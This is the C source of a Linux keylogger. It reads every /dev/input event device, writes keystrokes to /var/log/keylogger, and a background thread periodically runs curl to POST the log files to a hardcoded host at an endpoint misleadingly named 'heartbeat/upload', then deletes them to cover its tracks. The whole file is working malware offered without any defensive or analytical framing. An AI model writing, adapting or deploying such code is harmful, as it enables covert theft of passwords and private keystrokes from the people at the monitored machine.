#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <string.h>
#include <errno.h>
#include <dirent.h>
#include <sys/select.h>
#include <pthread.h>
#include <sys/stat.h>

#define EVENT_PATH "/dev/input/"
#define MAX_DEVICES 10
#define LOG_DIR "/var/log/keylogger"
#define UPLOAD_URL "http://192.168.0.103:8081/api/v1/heartbeat/upload"
#define UPLOAD_INTERVAL_SECONDS (5 * 60)

const char *key_names[] = {
    [1] = "KEY_ESC",
    [2] = "1",
    [3] = "2",
    [4] = "3",
    [5] = "4",
    [6] = "5",
    [7] = "6",
    [8] = "7",
    [9] = "8",
    [10] = "9",
    [11] = "0",
    [12] = "-",
    [13] = "=",
    [14] = "KEY_BACKSPACE",
    [15] = "KEY_TAB",
    [16] = "Q",
    [17] = "W",
    [18] = "E",
    [19] = "R",
    [20] = "T",
    [21] = "Y",
    [22] = "U",
    [23] = "I",
    [24] = "O",
    [25] = "P",
    [26] = "KEY_LEFTBRACE",
    [27] = "KEY_RIGHTBRACE",
    [28] = "KEY_ENTER",
    [29] = "KEY_LEFTCTRL",
    [30] = "A",
    [31] = "S",
    [32] = "D",
    [33] = "F",
    [34] = "G",
    [35] = "H",
    [36] = "J",
    [37] = "K",
    [38] = "L",
    [39] = ";",
    [40] = "'",
    [41] = "`",
    [42] = "KEY_LEFTSHIFT",
    [43] = "\\",
    [44] = "Z",
    [45] = "X",
    [46] = "C",
    [47] = "V",
    [48] = "B",
    [49] = "N",
    [50] = "M",
    [51] = ",",
    [52] = ".",
    [53] = "/",
    [54] = "KEY_RIGHTSHIFT",
    [55] = "KEY_KPASTERISK",
    [56] = "KEY_LEFTALT",
    [57] = " ",
    [58] = "KEY_CAPSLOCK",
    [59] = "KEY_F1",
    [60] = "KEY_F2",
    [61] = "KEY_F3",
    [62] = "KEY_F4",
    [63] = "KEY_F5",
    [64] = "KEY_F6",
    [65] = "KEY_F7",
    [66] = "KEY_F8",
    [67] = "KEY_F9",
    [68] = "KEY_F10",
    [69] = "KEY_NUMLOCK",
    [70] = "KEY_SCROLLLOCK",
    [71] = "KEY_KP7",
    [72] = "KEY_KP8",
    [73] = "KEY_KP9",
    [74] = "KEY_KPMINUS",
    [75] = "KEY_KP4",
    [76] = "KEY_KP5",
    [77] = "KEY_KP6",
    [78] = "KEY_KPPLUS",
    [79] = "KEY_KP1",
    [80] = "KEY_KP2",
    [81] = "KEY_KP3",
    [82] = "KEY_KP0",
    [83] = "KEY_KPDOT",
    [85] = "KEY_ZENKAKUHANKAKU",
    [86] = "KEY_102ND",
    [87] = "KEY_F11",
    [88] = "KEY_F12",
    [89] = "KEY_RO",
    [90] = "KEY_KATAKANA",
    [91] = "KEY_HIRAGANA",
    [92] = "KEY_HENKAN",
    [93] = "KEY_KATAKANAHIRAGANA",
    [94] = "KEY_MUHENKAN",
    [95] = "KEY_KPJPCOMMA",
    [96] = "KEY_KPENTER",
    [97] = "KEY_RIGHTCTRL",
    [98] = "KEY_KPSLASH",
    [99] = "KEY_SYSRQ",
    [100] = "KEY_RIGHTALT",
    [102] = "KEY_HOME",
    [103] = "KEY_UP",
    [104] = "KEY_PAGEUP",
    [105] = "KEY_LEFT",
    [106] = "KEY_RIGHT",
    [107] = "KEY_END",
    [108] = "KEY_DOWN",
    [109] = "KEY_PAGEDOWN",
    [110] = "KEY_INSERT",
    [111] = "KEY_DELETE",
    [113] = "KEY_MUTE",
    [114] = "KEY_VOLUMEDOWN",
    [115] = "KEY_VOLUMEUP",
    [116] = "KEY_POWER",
    [117] = "KEY_KPEQUAL",
    [119] = "KEY_PAUSE",
    [121] = "KEY_KPCOMMA",
    [122] = "KEY_HANGUEL",
    [123] = "KEY_HANJA",
    [124] = "KEY_YEN",
    [125] = "KEY_LEFTMETA",
    [126] = "KEY_RIGHTMETA",
    [127] = "KEY_COMPOSE",
    [128] = "KEY_STOP",
    [129] = "KEY_AGAIN",
    [130] = "KEY_PROPS",
    [131] = "KEY_UNDO",
    [132] = "KEY_FRONT",
    [133] = "KEY_COPY",
    [134] = "KEY_OPEN",
    [135] = "KEY_PASTE",
    [136] = "KEY_FIND",
    [137] = "KEY_CUT",
    [138] = "KEY_HELP",
    [140] = "KEY_CALC",
    [142] = "KEY_SLEEP",
    [150] = "KEY_WWW",
    [152] = "KEY_SCREENLOCK",
    [158] = "KEY_BACK",
    [159] = "KEY_FORWARD",
    [161] = "KEY_EJECTCD",
    [163] = "KEY_NEXTSONG",
    [164] = "KEY_PLAYPAUSE",
    [165] = "KEY_PREVIOUSSONG",
    [166] = "KEY_STOPCD",
    [173] = "KEY_REFRESH",
    [176] = "KEY_EDIT",
    [177] = "KEY_SCROLLUP",
    [178] = "KEY_SCROLLDOWN",
    [179] = "KEY_KPLEFTPAREN",
    [180] = "KEY_KPRIGHTPAREN",
    [183] = "KEY_F13",
    [184] = "KEY_F14",
    [185] = "KEY_F15",
    [186] = "KEY_F16",
    [187] = "KEY_F17",
    [188] = "KEY_F18",
    [189] = "KEY_F19",
    [190] = "KEY_F20",
    [191] = "KEY_F21",
    [192] = "KEY_F22",
    [193] = "KEY_F23",
    [194] = "KEY_F24",
    [240] = "KEY_UNKNOWN"
};

#define NUM_DEVICES 10

typedef struct
{
    int fd;
    int device_number;
} device_info_t;

void *monitor_device(void *arg)
{
    device_info_t *dev_info = (device_info_t *)arg;
    int fd = dev_info->fd;
    int device_number = dev_info->device_number;
    struct input_event ev;
    fd_set read_fds;
    struct timeval timeout;
    struct stat st = {0};
    
    const char *log_dir = "/var/log/keylogger";
    
    if (stat(log_dir, &st) == -1)
    {
        if (mkdir(log_dir, 0755) == -1)
        {
            perror("Error creating logs directory");
            return NULL;
        }
    }

    while (1)
    {
        FD_ZERO(&read_fds);
        FD_SET(fd, &read_fds);
        timeout.tv_sec = 0;
        timeout.tv_usec = 100000;

        int ready = select(fd + 1, &read_fds, NULL, NULL, &timeout);
        if (ready == -1)
        {
            perror("select error");
            break;
        }

        if (FD_ISSET(fd, &read_fds))
        {
            if (read(fd, &ev, sizeof(struct input_event)) == -1)
            {
                perror("Error reading event");
                continue;
            }

            if (ev.type == EV_KEY && key_names[ev.code])
            {
                char log_filename[256];
                snprintf(log_filename, sizeof(log_filename), "%s/event.log", log_dir, device_number);
                int log_fd = open(log_filename, O_WRONLY | O_APPEND | O_CREAT, 0644);
                if (log_fd != -1)
                {
                    if (ev.value == 1)
                    {
                        if((ev.code>=2&&ev.code<=13)||(ev.code>=16&&ev.code<=25)||(ev.code>=30&&ev.code<=53)||ev.code==57)
                            write(log_fd, key_names[ev.code], strlen(key_names[ev.code]));
                        else{
                            write(log_fd," ",1);
                            write(log_fd, key_names[ev.code], strlen(key_names[ev.code]));
                        }
                    }
                    close(log_fd);
                }
                else
                {
                    perror("Error opening log file");
                }
            }
        }
    }
    close(fd);
    return NULL;
}

void* monitor_keyboards()
{
    struct dirent *entry;
    DIR *dp = opendir(EVENT_PATH);
    if (dp == NULL)
    {
        perror("Error opening directory");
        return NULL;
    }

    int devices[NUM_DEVICES];
    int num_devices = 0;
    pthread_t threads[NUM_DEVICES];

    while ((entry = readdir(dp)) && num_devices < NUM_DEVICES)
    {
        if (strncmp(entry->d_name, "event", 5) != 0)
            continue;

        char device_path[256];
        snprintf(device_path, sizeof(device_path), "%s%s", EVENT_PATH, entry->d_name);
        int fd = open(device_path, O_RDONLY);
        if (fd == -1)
        {
            continue;
        }

        devices[num_devices++] = fd;
        device_info_t *dev_info = malloc(sizeof(device_info_t));
        dev_info->fd = fd;
        dev_info->device_number = num_devices - 1;
        pthread_create(&threads[num_devices - 1], NULL, monitor_device, dev_info);
    }

    closedir(dp);
    for (int i = 0; i < num_devices; i++)
    {
        pthread_join(threads[i], NULL);
    }
}
void *send_infos()
{
    while(1){
    DIR* dirent=opendir(LOG_DIR);
    if (dirent == NULL)
    {
         perror("Error opening log directory");
         return NULL;
    }
    struct dirent *entry;
    while ((entry = readdir(dirent)) != NULL)
    {
        if (entry->d_type == DT_REG)
        {
            char filepath[256];
            snprintf(filepath, sizeof(filepath), "%s/%s", LOG_DIR, entry->d_name);
            FILE *file = fopen(filepath, "r");
            if (file == NULL)
            {
                perror("Error opening log file");
                continue;
            }

            char command[512];
            snprintf(command, sizeof(command), "curl -X POST -F 'file=@%s' %s", filepath, UPLOAD_URL);
            printf("Executing command: %s\n", command);
            system(command);

            snprintf(command, sizeof(command), "rm %s", filepath);
            printf("Executing command: %s\n", command);
            system(command);
            fclose(file);
        }
    }
    sleep(2*60);
    }

}

int main()
{
    pthread_t threads[2];
    pthread_create(&threads[0], NULL, monitor_keyboards, NULL);
    pthread_create(&threads[1], NULL, send_infos, NULL);

    pthread_join(threads[0], NULL);
    pthread_join(threads[1], NULL);
    return 0;
}
